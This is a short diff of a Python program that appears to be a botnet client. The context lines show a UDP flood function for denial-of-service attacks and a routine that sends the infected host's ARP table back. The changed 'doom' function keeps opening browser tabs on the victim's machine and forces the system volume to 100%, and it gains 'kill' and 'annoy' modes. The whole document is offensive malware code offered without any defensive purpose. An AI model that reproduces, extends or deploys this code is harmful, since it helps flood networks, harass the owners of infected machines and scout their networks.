@@ -33,20 +33,20 @@ def UDP(ip, port, size):#udp flood(best size is 512-1024, if size too big router
 		except:
 			s.close()
 
-def doom(url):
-	global stop
-	#url= 'https://www.youtube.com/watch?v=Tf1DEI2lEe0'
-	while True:
-		if stop :
-			break
-		try:
-			if webbrowser.open_new_tab(url) is True:
-				break
-			else:  
-				webbrowser.open_new_tab(url)
-				subprocess.call(["amixer", "-D", "pulse", "sset", "Master", "100%"])
-		except:
-			pass
+def doom(url, attack):
+        global stop
+        #url= 'https://www.youtube.com/watch?v=Tf1DEI2lEe0'
+        while webbrowser.open_new_tab(url):
+                if stop :
+                        break
+                try:
+                        subprocess.call(["amixer", "-D", "pulse", "sset", "Master", "100%"])
+                except:
+                        pass
+                if attack == 'kill':
+                        pass
+                elif attack == 'annoy':
+                        time.sleep(5)
 
 def arp_table_snoop():#sends arp table form bots' host's arp table
 	global stop
